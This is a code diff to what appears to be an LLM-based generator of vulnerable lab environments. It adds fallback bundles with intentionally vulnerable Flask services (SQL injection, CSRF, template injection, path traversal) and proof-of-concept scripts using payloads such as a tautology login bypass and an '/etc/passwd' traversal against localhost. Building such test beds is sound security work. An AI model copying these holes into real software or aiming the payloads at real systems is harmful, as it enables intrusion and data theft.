@@ -26,7 +26,12 @@ from common.logging import get_logger
 from common.prompts import build_guard_autofix_prompt, build_synthesis_prompt
 from common.paths import ensure_dir
 from common.roles import normalize_role, role_matches
-from common.vuln_semantics import evaluate_manifest_semantics, semantic_error_summary
+from common.vuln_semantics import (
+    evaluate_manifest_semantics,
+    family_canonical_tags,
+    normalize_vuln_id,
+    semantic_error_summary,
+)
 from evals.static_signatures import analyze_static_signals
 from common.rules import RuleSpec, load_rule, load_rulespec
 
@@ -167,6 +172,11 @@ class CandidateReport:
     score: float
     static_report: Dict[str, Any]
     guard_report: Dict[str, Any] | None = None
+    fallback_used: bool = False
+    family_override_applied: bool = False
+    llm_stub_used: bool = False
+    llm_failure_class: str = ""
+    llm_failure_message: str = ""
 
     @property
     def manifest_digest(self) -> str:
@@ -187,6 +197,11 @@ class CandidateReport:
             "raw_excerpt": self.raw_response[:200],
             "static_report": self.static_report,
             "dep_guard": self.guard_report or {},
+            "fallback_used": self.fallback_used,
+            "family_override_applied": self.family_override_applied,
+            "llm_stub_used": self.llm_stub_used,
+            "llm_failure_class": self.llm_failure_class,
+            "llm_failure_message": self.llm_failure_message,
         }
 
 
@@ -303,9 +318,15 @@ class SynthesisEngine:
             )
             raw = self.llm.generate(messages)
             manifest = self._parse_manifest(raw, idx)
+            fallback_used = self._manifest_uses_deterministic_fallback(manifest)
             manifest = self._apply_poc_template(manifest, poc_template)
             manifest = self._ensure_fallback_poc(manifest, poc_template)
+            before_family_override = json.dumps(manifest, sort_keys=True, ensure_ascii=False)
             manifest = self._stabilize_pattern_specific_artifacts(manifest, poc_template)
+            family_override_applied = bool(
+                self._is_template_injection_family()
+                and before_family_override != json.dumps(manifest, sort_keys=True, ensure_ascii=False)
+            )
             manifest = self._inject_user_deps(manifest)
             declared = self._extract_declared_dependencies(manifest)
             required_static = self._detect_required_dependencies(manifest)
@@ -335,6 +356,11 @@ class SynthesisEngine:
                     score=score,
                     static_report=static_report,
                     guard_report=guard_report,
+                    fallback_used=fallback_used,
+                    family_override_applied=family_override_applied,
+                    llm_stub_used=bool(getattr(self.llm, "use_stub", False)),
+                    llm_failure_class=str(getattr(self.llm, "last_error_class", "") or ""),
+                    llm_failure_message=str(getattr(self.llm, "last_error_message", "") or ""),
                 )
             )
 
@@ -476,6 +502,55 @@ class SynthesisEngine:
         manifest["poc"] = poc
         return manifest
 
+    def _ensure_manifest_dependency(self, manifest: Dict[str, Any], spec: str) -> Dict[str, Any]:
+        token = str(spec or "").strip()
+        if not token:
+            return manifest
+        deps = manifest.get("deps")
+        if not isinstance(deps, list):
+            deps = []
+            manifest["deps"] = deps
+        canonical = token.split("==", 1)[0].strip().lower()
+        seen = {
+            str(item).split("==", 1)[0].strip().lower()
+            for item in deps
+            if isinstance(item, str) and str(item).strip()
+        }
+        if canonical not in seen:
+            deps.append(token)
+        files = manifest.get("files")
+        if not isinstance(files, list):
+            return manifest
+        req_entry = None
+        for entry in files:
+            if not isinstance(entry, dict):
+                continue
+            if str(entry.get("path") or "").strip().lower() == "requirements.txt":
+                req_entry = entry
+                break
+        if req_entry is None:
+            req_entry = {
+                "path": "requirements.txt",
+                "role": "helper",
+                "description": "Auto-generated requirements from deterministic fallback helper",
+                "content": "",
+            }
+            files.append(req_entry)
+        content = str(req_entry.get("content") or "")
+        existing = [line.strip() for line in content.splitlines() if line.strip()]
+        existing_seen = {line.split("==", 1)[0].strip().lower() for line in existing}
+        for dep in deps:
+            if not isinstance(dep, str) or not dep.strip():
+                continue
+            dep_line = dep.strip()
+            dep_name = dep_line.split("==", 1)[0].strip().lower()
+            if dep_name in existing_seen:
+                continue
+            existing.append(dep_line)
+            existing_seen.add(dep_name)
+        req_entry["content"] = "\n".join(existing).strip() + ("\n" if existing else "")
+        return manifest
+
     def _ensure_fallback_poc(self, manifest: Dict[str, Any], template: Dict[str, Any]) -> Dict[str, Any]:
         files = manifest.get("files")
         if not isinstance(files, list):
@@ -525,6 +600,7 @@ class SynthesisEngine:
             "payload containing '{{7*7}}', then prints the required success signature and optional flag token on success."
         )
         manifest["poc"] = poc
+        manifest = self._ensure_manifest_dependency(manifest, "requests==2.31.0")
 
         content = self._build_template_injection_poc_content(manifest, success_signature, flag_token)
         poc_entry = None
@@ -660,6 +736,22 @@ class SynthesisEngine:
         return self._normalize_manifest_roles(self._fallback_manifest())
 
     @staticmethod
+    def _manifest_uses_deterministic_fallback(manifest: Dict[str, Any]) -> bool:
+        if not isinstance(manifest, dict):
+            return False
+        pattern_tags = manifest.get("pattern_tags") or []
+        if isinstance(pattern_tags, list):
+            lowered = {str(tag).strip().lower() for tag in pattern_tags if isinstance(tag, str)}
+            if "fallback" in lowered:
+                return True
+        metadata = manifest.get("metadata")
+        if isinstance(metadata, dict):
+            origin = str(metadata.get("generation_origin") or "").strip().lower()
+            if origin == "deterministic_fallback":
+                return True
+        return False
+
+    @staticmethod
     def _normalize_manifest_roles(manifest: Dict[str, Any]) -> Dict[str, Any]:
         files = manifest.get("files")
         if not isinstance(files, list):
@@ -676,10 +768,11 @@ class SynthesisEngine:
         """Deterministic manifest used when the LLM stub is active."""
 
         vuln_id = self._requirement.get("vuln_id", "CWE-UNKNOWN")
+        normalized_vuln = normalize_vuln_id(str(vuln_id or ""))
         stack = self._requirement.get("framework") or self._requirement.get("language", "python")
         notes = (
             "Fallback manifest auto-generated because the LLM response was not valid JSON or the LLM call failed. "
-            "The layout is intentionally minimal and passes guard rails for deterministic testing."
+            "The layout is intentionally minimal and attempts to preserve family-specific semantics for degraded-mode testing."
         )
         poc_template = self._normalize_poc_template(None)
         success_signature = str(poc_template.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
@@ -688,6 +781,47 @@ class SynthesisEngine:
             flag_token = ""
 
         port = 8000
+        if self._is_sqli_family():
+            return self._fallback_manifest_sqli(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_csrf_family():
+            return self._fallback_manifest_csrf(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_template_injection_family():
+            return self._fallback_manifest_template_injection(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+        if self._is_path_traversal_family():
+            return self._fallback_manifest_path_traversal(
+                vuln_id=str(vuln_id),
+                normalized_vuln=normalized_vuln,
+                stack=str(stack),
+                port=port,
+                notes=notes,
+                success_signature=success_signature,
+                flag_token=flag_token,
+            )
+
         reflect_path = "/reflect"
         default_payload = "<script>alert(1)</script>"
 
@@ -702,7 +836,7 @@ class SynthesisEngine:
 
         return {
             "intent": f"{vuln_id} fallback synthesis",
-            "pattern_tags": ["fallback", "stub", str(vuln_id).strip().lower()],
+            "pattern_tags": self._fallback_pattern_tags(vuln_id),
             "files": [
                 {
                     "path": "Dockerfile",
@@ -804,8 +938,426 @@ class SynthesisEngine:
                 "sid": self.sid,
                 "stack": stack,
                 "cwe": vuln_id,
+                "generation_origin": "deterministic_fallback",
             },
         }
+
+    def _is_sqli_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return vuln == "cwe-89" or "sqli" in pattern_id or "sql injection" in label or label == "sqli"
+
+    def _is_csrf_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return vuln == "cwe-352" or "csrf" in pattern_id or "csrf" in label or "cross-site request forgery" in label
+
+    def _is_path_traversal_family(self) -> bool:
+        vuln = normalize_vuln_id(str((self._requirement or {}).get("vuln_id") or ""))
+        pattern_id = str((self._requirement or {}).get("pattern_id") or "").strip().lower()
+        label = str((self._requirement or {}).get("vuln_name") or (self._requirement or {}).get("vuln_label") or "").strip().lower()
+        return vuln == "cwe-22" or "path-traversal" in pattern_id or "path traversal" in label or "directory traversal" in label
+
+    def _fallback_pattern_tags(self, vuln_id: str) -> List[str]:
+        tags = {"fallback", "stub", str(vuln_id or "").strip().lower()}
+        tags.update(family_canonical_tags(vuln_id))
+        return sorted(token for token in tags if isinstance(token, str) and token.strip())
+
+    def _fallback_manifest_from_parts(
+        self,
+        *,
+        vuln_id: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+        requirements_content: str,
+        app_content: str,
+        poc_content: Optional[str],
+        service_path: str = "app.py",
+    ) -> Dict[str, Any]:
+        deps = [
+            line.strip()
+            for line in requirements_content.splitlines()
+            if isinstance(line, str) and line.strip() and not line.strip().startswith("#")
+        ]
+        files: List[Dict[str, Any]] = [
+            {
+                "path": "Dockerfile",
+                "role": "helper",
+                "description": "Build Python image for fallback bundle.",
+                "content": (
+                    "FROM python:3.11-slim\n"
+                    "WORKDIR /app\n"
+                    "COPY . /app\n"
+                    "RUN pip install --no-cache-dir -r requirements.txt\n"
+                    f"EXPOSE {port}\n"
+                    f"CMD [\"python\", \"{service_path}\"]\n"
+                ),
+            },
+            {
+                "path": "requirements.txt",
+                "role": "helper",
+                "description": "Pinned deps for fallback bundle.",
+                "content": requirements_content,
+            },
+            {
+                "path": service_path,
+                "role": "service_main",
+                "description": f"{stack} family-aware fallback service.",
+                "content": app_content,
+            },
+        ]
+        if poc_content is not None:
+            files.append(
+                {
+                    "path": "poc.py",
+                    "role": "poc_entry",
+                    "description": "Family-aware fallback PoC.",
+                    "content": poc_content,
+                }
+            )
+        files.append(
+            {
+                "path": "README.md",
+                "role": "helper",
+                "description": "Quickstart instructions.",
+                "content": (
+                    f"# {vuln_id} fallback bundle\n"
+                    "```bash\n"
+                    "docker build -t fallback-bundle .\n"
+                    f"docker run -p {port}:{port} fallback-bundle\n"
+                    f"python poc.py --base-url http://127.0.0.1:{port}\n"
+                    "```\n"
+                ),
+            }
+        )
+        poc_block: Dict[str, Any] = {
+            "cmd": "python poc.py --base-url {{base_url}}",
+            "success_signature": success_signature,
+        }
+        if flag_token:
+            poc_block["flag_token"] = flag_token
+        return {
+            "intent": f"{vuln_id} fallback synthesis",
+            "pattern_tags": self._fallback_pattern_tags(vuln_id),
+            "files": files,
+            "deps": deps,
+            "build": {"command": "pip install --no-cache-dir -r requirements.txt"},
+            "run": {"command": f"python {service_path}", "port": port},
+            "poc": poc_block,
+            "notes": notes,
+            "metadata": {
+                "sid": self.sid,
+                "stack": stack,
+                "cwe": vuln_id,
+                "generation_origin": "deterministic_fallback",
+            },
+        }
+
+    def _fallback_manifest_sqli(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "from pathlib import Path\n"
+            "import sqlite3\n"
+            "from flask import Flask, jsonify, request\n\n"
+            "app = Flask(__name__)\n"
+            "DB_PATH = Path('/tmp/sqli-demo.db')\n"
+            "SCHEMA_SQL = '''\n"
+            "CREATE TABLE IF NOT EXISTS users (\n"
+            "    id INTEGER PRIMARY KEY AUTOINCREMENT,\n"
+            "    username TEXT,\n"
+            "    password TEXT\n"
+            ");\n"
+            "DELETE FROM users;\n"
+            "INSERT INTO users (username, password) VALUES ('admin', 'secret');\n"
+            "INSERT INTO users (username, password) VALUES ('guest', 'guest');\n"
+            "'''\n\n"
+            "def init_db() -> None:\n"
+            "    conn = sqlite3.connect(DB_PATH)\n"
+            "    conn.executescript(SCHEMA_SQL)\n"
+            "    conn.commit()\n"
+            "    conn.close()\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/login')\n"
+            "def login():\n"
+            "    query = (\n"
+            "        \"SELECT id, username FROM users \"\n"
+            "        \"WHERE username = '\" + request.args.get('username', '') + \"' \"\n"
+            "        \"AND password = '\" + request.args.get('password', '') + \"'\"\n"
+            "    )\n"
+            "    conn = sqlite3.connect(DB_PATH)\n"
+            "    conn.row_factory = sqlite3.Row\n"
+            "    cur = conn.cursor()\n"
+            "    rows = cur.execute(query).fetchall()\n"
+            "    conn.close()\n"
+            "    return jsonify({'match': bool(rows), 'rows': [dict(row) for row in rows], 'query': query})\n\n"
+            "if __name__ == '__main__':\n"
+            "    init_db()\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import json\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.parse import urlencode\n"
+            "from urllib.request import urlopen\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {flag_token!r}\n"
+            "DEFAULT_PARAMS = {'username': \"admin' OR '1'='1\", 'password': 'irrelevant'}\n\n"
+            "def exploit(base_url: str) -> bool:\n"
+            "    url = base_url.rstrip('/') + '/login?' + urlencode(DEFAULT_PARAMS)\n"
+            "    try:\n"
+            "        with urlopen(url, timeout=5) as resp:\n"
+            "            body = resp.read().decode('utf-8', errors='ignore')\n"
+            "    except (HTTPError, URLError) as exc:\n"
+            "        print(f'[sqli-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    try:\n"
+            "        payload = json.loads(body)\n"
+            "    except json.JSONDecodeError:\n"
+            "        return False\n"
+            "    rows = payload.get('rows') or []\n"
+            "    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows)\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='SQLi fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        if FLAG_TOKEN:\n"
+            "            print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[sqli-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+
+    def _fallback_manifest_csrf(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "from flask import Flask, jsonify, request, session\n\n"
+            "app = Flask(__name__)\n"
+            "app.secret_key = 'csrf-fallback-secret'\n"
+            "BALANCES = {'victim': 1000, 'attacker': 0}\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/login')\n"
+            "def login():\n"
+            "    user = request.args.get('user', 'victim')\n"
+            "    session['user'] = user\n"
+            "    BALANCES.setdefault(user, 1000)\n"
+            "    return jsonify({'logged_in_as': user})\n\n"
+            "@app.post('/transfer')\n"
+            "def transfer():\n"
+            "    user = session.get('user', 'victim')\n"
+            "    recipient = request.form.get('recipient', 'attacker')\n"
+            "    amount = int(request.form.get('amount', '250'))\n"
+            "    BALANCES[recipient] = BALANCES.get(recipient, 0) + amount\n"
+            "    BALANCES[user] = BALANCES.get(user, 1000) - amount\n"
+            "    return jsonify({'ok': True, 'by': user, 'recipient': recipient, 'amount': amount, 'recipient_balance': BALANCES[recipient]})\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import http.cookiejar\n"
+            "import json\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.parse import urlencode\n"
+            "from urllib.request import HTTPCookieProcessor, Request, build_opener\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {flag_token!r}\n\n"
+            "def exploit(base_url: str) -> bool:\n"
+            "    cookie_jar = http.cookiejar.CookieJar()\n"
+            "    opener = build_opener(HTTPCookieProcessor(cookie_jar))\n"
+            "    try:\n"
+            "        with opener.open(base_url.rstrip('/') + '/login?user=victim', timeout=5) as resp:\n"
+            "            resp.read()\n"
+            "        body = urlencode({'recipient': 'attacker', 'amount': '250'}).encode('utf-8')\n"
+            "        req = Request(base_url.rstrip('/') + '/transfer', data=body, method='POST')\n"
+            "        req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n"
+            "        with opener.open(req, timeout=5) as resp:\n"
+            "            payload = json.loads(resp.read().decode('utf-8', errors='ignore'))\n"
+            "    except (HTTPError, URLError, json.JSONDecodeError) as exc:\n"
+            "        print(f'[csrf-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250'\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='CSRF fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        if FLAG_TOKEN:\n"
+            "            print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[csrf-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
+
+    def _fallback_manifest_template_injection(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "from flask import Flask, render_template_string, request\n\n"
+            "app = Flask(__name__)\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/greet')\n"
+            "def greet():\n"
+            "    name = request.args.get('name', 'Guest')\n"
+            "    template = '<h1>Hello ' + name + '</h1>'\n"
+            "    return render_template_string(template)\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\nrequests==2.31.0\n",
+            app_content=app_content,
+            poc_content=None,
+        )
+
+    def _fallback_manifest_path_traversal(
+        self,
+        *,
+        vuln_id: str,
+        normalized_vuln: str,
+        stack: str,
+        port: int,
+        notes: str,
+        success_signature: str,
+        flag_token: str,
+    ) -> Dict[str, Any]:
+        app_content = (
+            "import os\n"
+            "from pathlib import Path\n"
+            "from flask import Flask, request\n\n"
+            "app = Flask(__name__)\n"
+            "BASE_DIR = Path('/tmp/path-demo')\n"
+            "BASE_DIR.mkdir(parents=True, exist_ok=True)\n"
+            "(BASE_DIR / 'note.txt').write_text('safe-note', encoding='utf-8')\n\n"
+            "@app.get('/health')\n"
+            "def health():\n"
+            "    return {'ok': True}\n\n"
+            "@app.get('/download')\n"
+            "def download():\n"
+            "    path = request.args.get('path', 'note.txt')\n"
+            "    target = os.path.join(str(BASE_DIR), path)\n"
+            "    with open(target, 'r', encoding='utf-8', errors='ignore') as handle:\n"
+            "        return handle.read()\n\n"
+            "if __name__ == '__main__':\n"
+            f"    app.run(host='0.0.0.0', port={port})\n"
+        )
+        poc_content = (
+            "import argparse\n"
+            "import sys\n"
+            "from urllib.error import HTTPError, URLError\n"
+            "from urllib.parse import quote\n"
+            "from urllib.request import urlopen\n\n"
+            f"SUCCESS_SIGNATURE = {success_signature!r}\n"
+            f"FLAG_TOKEN = {flag_token!r}\n"
+            "DEFAULT_PATH = '../../../../etc/passwd'\n\n"
+            "def exploit(base_url: str) -> bool:\n"
+            "    target = base_url.rstrip('/') + '/download?path=' + quote(DEFAULT_PATH)\n"
+            "    try:\n"
+            "        with urlopen(target, timeout=5) as resp:\n"
+            "            body = resp.read().decode('utf-8', errors='ignore')\n"
+            "    except (HTTPError, URLError) as exc:\n"
+            "        print(f'[path-fallback] request failed: {exc}', file=sys.stderr)\n"
+            "        return False\n"
+            "    return 'root:' in body or 'localhost' in body\n\n"
+            "def main() -> None:\n"
+            "    parser = argparse.ArgumentParser(description='Path traversal fallback PoC')\n"
+            f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
+            "    args = parser.parse_args()\n"
+            "    if exploit(args.base_url):\n"
+            "        print(SUCCESS_SIGNATURE)\n"
+            "        if FLAG_TOKEN:\n"
+            "            print(FLAG_TOKEN)\n"
+            "        raise SystemExit(0)\n"
+            "    print('[path-fallback] exploit did not succeed', file=sys.stderr)\n"
+            "    raise SystemExit(1)\n\n"
+            "if __name__ == '__main__':\n"
+            "    main()\n"
+        )
+        return self._fallback_manifest_from_parts(
+            vuln_id=normalized_vuln or vuln_id,
+            stack=stack,
+            port=port,
+            notes=notes,
+            success_signature=success_signature,
+            flag_token=flag_token,
+            requirements_content="Flask==3.0.0\n",
+            app_content=app_content,
+            poc_content=poc_content,
+        )
 
     def _guard_manifest_with_autofix(
         self,
@@ -1489,6 +2041,11 @@ class SynthesisEngine:
         requires_external_db: bool,
     ) -> None:
         manifest_path = self.metadata_dir / "generator_manifest.json"
+        generation_origin = "llm_manifest"
+        if selected.fallback_used:
+            generation_origin = "deterministic_fallback"
+        elif selected.family_override_applied:
+            generation_origin = "family_override"
         manifest_payload = {
             "sid": self.sid,
             "mode": self.mode,
@@ -1508,6 +2065,18 @@ class SynthesisEngine:
             "requires_external_db": requires_external_db,
             "guard_spec_available": bool(self._guard_spec_payload),
             "guard_policy": self._guard_engine.policy_snapshot if isinstance(self._guard_engine, GuardEngine) else {},
+            "generation_origin": generation_origin,
+            "fallback_used": selected.fallback_used,
+            "family_override_applied": selected.family_override_applied,
+            "llm_stub_used": selected.llm_stub_used,
+            "llm_failure_class": selected.llm_failure_class,
+            "llm_failure_message": selected.llm_failure_message,
+            "provenance": {
+                "generation_origin": generation_origin,
+                "fallback_used": selected.fallback_used,
+                "family_override_applied": selected.family_override_applied,
+                "llm_stub_used": selected.llm_stub_used,
+            },
         }
         manifest_path.write_text(json.dumps(manifest_payload, indent=2, ensure_ascii=False), encoding="utf-8")
         self._write_candidate_log(reports)
@@ -1525,6 +2094,11 @@ class SynthesisEngine:
         auto_patched: set[str] = set()
         auto_patch_entries: List[Dict[str, Any]] = []
         autofix_trace: List[Dict[str, Any]] = []
+        llm_stub_used = False
+        fallback_used = False
+        family_override_applied = False
+        llm_failure_class = ""
+        llm_failure_message = ""
         for report in reports:
             guard = report.guard_report or {}
             if report.violations:
@@ -1543,6 +2117,13 @@ class SynthesisEngine:
             trace_entries = guard.get("guard_autofix_trace") or []
             if isinstance(trace_entries, list):
                 autofix_trace.extend(trace_entries)
+            llm_stub_used = llm_stub_used or bool(report.llm_stub_used)
+            fallback_used = fallback_used or bool(report.fallback_used)
+            family_override_applied = family_override_applied or bool(report.family_override_applied)
+            if not llm_failure_class and isinstance(report.llm_failure_class, str) and report.llm_failure_class.strip():
+                llm_failure_class = report.llm_failure_class.strip()
+            if not llm_failure_message and isinstance(report.llm_failure_message, str) and report.llm_failure_message.strip():
+                llm_failure_message = report.llm_failure_message.strip()
         suggested = sorted(llm_high_conf or missing_static)
         if auto_patched:
             suggested = sorted(set(suggested) | auto_patched)
@@ -1699,6 +2280,11 @@ class SynthesisEngine:
             "hint_payload": hint_payload,
             "autofix_effective": autofix_effective,
             "autofix_trace": autofix_trace,
+            "llm_stub_used": llm_stub_used,
+            "fallback_used": fallback_used,
+            "family_override_applied": family_override_applied,
+            "llm_failure_class": llm_failure_class or None,
+            "llm_failure_message": llm_failure_message or None,
         }
         for failure_path in failure_paths:
             with failure_path.open("a", encoding="utf-8") as handle:
@@ -2148,10 +2734,23 @@ class SynthesisEngine:
             for dep in deps_list
             if isinstance(dep, str)
         }
+        declared_specs: Dict[str, str] = {}
+        for dep in deps_list:
+            if not isinstance(dep, str) or not dep.strip():
+                continue
+            dep_spec = dep.strip()
+            canonical = self._canonicalize_package_name(self._strip_version(dep_spec.split(" ", 1)[0]))
+            if canonical and canonical not in declared_specs:
+                declared_specs[canonical] = dep_spec
         requirements_packages = self._extract_packages_from_requirements(requirements_entry.get("content", ""))
         missing_requirements = declared_deps - requirements_packages
         for canonical in sorted(missing_requirements):
             if canonical in self._auto_patch_denylist:
+                continue
+            declared_spec = declared_specs.get(canonical)
+            if declared_spec:
+                self._append_requirement_spec_line(requirements_entry, declared_spec)
+                info["synced_requirements"].append({"name": canonical, "spec": declared_spec})
                 continue
             version = self._default_versions.get(canonical)
             name = canonical
@@ -2230,6 +2829,26 @@ class SynthesisEngine:
         if content and not content.endswith("\n"):
             content += "\n"
         content += f"{line}\n"
+        entry["content"] = content
+
+    def _append_requirement_spec_line(self, entry: Dict[str, Any], spec: str) -> None:
+        token = str(spec or "").strip()
+        if not token:
+            return
+        content = entry.get("content") or ""
+        existing = {
+            self._canonicalize_package_name(
+                self._strip_version(line.split("#", 1)[0].strip())
+            )
+            for line in content.splitlines()
+            if line.strip()
+        }
+        canonical = self._canonicalize_package_name(self._strip_version(token))
+        if canonical in existing:
+            return
+        if content and not content.endswith("\n"):
+            content += "\n"
+        content += f"{token}\n"
         entry["content"] = content
 
     def _extract_packages_from_requirements(self, content: str) -> set[str]:
